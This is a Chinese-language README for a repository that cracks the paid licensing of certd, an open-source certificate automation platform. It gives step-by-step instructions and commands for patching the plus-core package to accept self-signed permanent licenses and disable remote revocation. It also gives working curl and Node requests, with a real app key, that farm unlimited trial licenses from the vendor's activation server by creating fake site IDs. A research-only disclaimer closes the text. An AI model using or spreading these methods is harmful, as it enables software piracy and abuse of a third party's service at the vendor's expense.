# Certd VIP 终身激活工具

> 完整利用 certd（开源证书自动化平台）授权体系漏洞的激活工具链。
> 含：专用版 patched plus-core + 永久 license + 一键激活脚本 + 完整逆向分析报告。
> **仅供安全研究与学习用途。**

## 背景 / 原理摘要

certd 专业版（plus）与商业版（comm）的判权核心在 npm 包 `@certd/plus-core`：

1. **License 验签**：base64 JSON + RSA-SHA256 签名，签名内容
   `appKey,subjectId,code,secret,vipType,activeTime,duration,expireTime,version`
   验签公钥**硬编码在包内**（`dist/index.js` 中 `let l="<base64>"` 常量）。
2. **试用期无限刷**：激活服务器 `https://api.handfree.work/api` 的
   `/activation/subject/register` 接口无鉴权，自造 nanoid 作 siteId 即可注册，
   拿到 free license（含 secret），再签名调 `/activation/subject/vip/trialGet`
   领 7 天 plus/comm 试用。服务端仅按 subjectId 判重 → **换 ID 无限续**。
3. **永久激活**（自部署）：对本地 `node_modules/@certd/plus-core/dist/index.js`
   做四处 patch（换公钥 / 禁远程打回 / 禁自杀定时器 / 禁远程覆盖），
   用自持私钥签发 `expireTime:-1` 的 license 即 `isPlus()=true` 永久。

详细漏洞分析与全程 raw request/response 见 [docs/01-报告.md](docs/01-报告-certd-VIP激活机制分析.md)。

## 目录结构

```
certd-vip-activator/
├── README.md                        ← 本文件（使用教程）
├── docs/
│   └── 01-报告-certd-VIP激活机制分析.md   ← 完整安全分析报告（raw PoC）
├── PoC/
│   ├── poc_certd_vip_onclick.js     ← ★ 一键激活脚本（自部署实例用）
│   ├── poc_selfsign.js              ← 自签 key 生成 + 四处 patch
│   ├── poc_selfsign_v2.js           ← PKCS#1 公钥格式修正
│   ├── poc_selfsign_comm.js         ← 商业版(comm)永久 license 生成
│   └── verify_permanent.mjs         ← 激活结果验证脚本
├── patched/
│   ├── plus-core-orig.js            ← 原版 plus-core v1.44.4（对照）
│   ├── plus-core-patched.js         ← ★ 已 patch 的 plus-core（公钥已换）
│   ├── selfsign_pub.pem             ← PoC 公钥（与 patched 配套）
│   ├── license_permanent.b64        ← 永久专业版 license
│   ├── license_permanent_comm.b64   ← 永久商业版 license
│   └── trial_license.b64            ← 7 天试用 license（漏洞实证）
└── full-src/                        ← certd 完整源码（上游 github.com/certd/certd）
```

## 使用教程

### 前提

- 已部署 certd 实例（docker 自部署或源码运行），有服务器/主机 shell 权限
- Node.js ≥ 18

### 方式一：一键激活（推荐）

在**目标 certd 部署目录**（含 `node_modules`）执行：

```bash
# 1. 克隆本仓库
git clone https://github.com/<你的用户名>/certd-vip-activator.git
cd certd-vip-activator/PoC

# 2. 在目标机器上执行（路径换成你 certd 实例根目录）
node poc_certd_vip_onclick.js /path/to/certd

# 3. 按脚本输出，将 license 写入数据库（二选一）：
#    A. 数据库直接改（sqlite/mysql 通用）：
UPDATE certd SET setting = '{"license":"<license_permanent.b64 文件内容>"}' WHERE setting_key = 'sys.license';
# 具体表名视你的部署（默认表 sys_settings，字段 setting_key / setting）

# 4. 重启 certd → 后台显示专业版，专业版功能全部解锁
```

### 方式二：手动 patch + 自签（不想用仓库里预生成 key）

```bash
cd /path/to/certd   # certd 部署根目录

# 1. 备份 + patch plus-core（脚本自动完成：备份.orig / 换公钥 / 四处逻辑 patch）
node /path/to/PoC/poc_selfsign.js            # 生成 selfsign_key.pem + patch
node /path/to/PoC/poc_selfsign_v2.js         # 修正公钥为 PKCS#1 格式
node /path/to/PoC/poc_selfsign_comm.js       # （可选）生成商业版永久 license

# 2. 验证
node /path/to/PoC/verify_permanent.mjs
# 期望输出：
#   verified: true | vipType: plus | expire: -1
#   checkPlus(): 通过 (专业版功能已解锁)

# 3. license 写库（同方式一步骤 3）+ 重启
```

### 方式三：无限 VIP 试用（自造主体白嫖官方，无需 patch）

```bash
# 1. 自造 siteId（nanoid 21位）
node -e "const {nanoid}=require('nanoid');console.log(nanoid())"

# 2. 注册拿 secret
curl -s -X POST https://api.handfree.work/api/activation/subject/register \
  -H 'Content-Type: application/json' \
  -d '{"appKey":"kQth6FHM71IPV3qdWc","subjectId":"<你的siteId>","installTime":'$(date +%s000)'}'
# 响应 data.license base64 解码 → 取 secret

# 3. 签名领 7 天试用
node -e "
const crypto=require('crypto');
const secret='<上一步的secret>';
const ts=Date.now();
const sign=crypto.createHash('sha256')
  .update(JSON.stringify({vipType:'plus'})+'.'+ts+'.'+secret).digest('base64');
const header=Buffer.from(JSON.stringify({
  subjectId:'<你的siteId>',
  appKey:'kQth6FHM71IPV3qdWc',
  sign:sign,
  timestamps:ts
})).toString('base64');
fetch('https://api.handfree.work/api/activation/subject/vip/trialGet',{
  method:'POST',
  headers:{'Content-Type':'application/json','X-Plus-Subject':header},
  body:JSON.stringify({vipType:'plus'})
}).then(r=>r.json()).then(j=>console.log(Buffer.from(j.data.license,'base64').toString()));
"
# 4. 输出的 license（vipType:plus, 7天）写库 sys.license，重启即生效
# 5. 到期/已领过 → 换新 siteId 重复步骤 1-3，无限续
```

## 验证激活成功

certd 后台 → 系统设置 → 授权信息：
- 专业版：`授权信息:plus,2099-xx-xx` 或 `永久`
- 商业版：`授权信息:comm,...`
- 或终端 `node verify_permanent.mjs` 输出 `isPlus(): true`

## 常见问题

**Q：patched 后启动报 `license 校验失败` 退出？**
A：本工具已 patch 掉自杀定时器；若你用其他途径 patch 漏掉这一步，随机 1h 内 process.exit(0)。

**Q：试用领了提示「您已经是专业版」？**
A：上次试用未过期。用 `/activation/subject/license/update` 把服务器侧当前 license 拉回，或等过期换 siteId。

**Q：远程 check 会把 license 打回 free？**
A：patch3 已禁用打回逻辑（`verifyFromRemote` 的退回分支已移除），且 patch4 禁用了 `refreshLicense` 远端覆盖。

**Q：只有 docker 部署怎么办？**
A：`docker exec -it <container> sh` 后进 `/app/node_modules/@certd/plus-core/dist/` 操作，或把 `patched/plus-core-patched.js` 直接 `docker cp` 进容器替换。

## 合规说明

- 本项目仅用于对 certd 的**自部署实例**和自己拥有管理权的环境做安全验证。
- **不得**用于：攻击他人部署的 certd 实例、绕过任何人授权、商业反竞争。
- 发现的安全漏洞已在本报告分析中体现，建议使用者通过负责任披露反馈给上游 certd 项目。
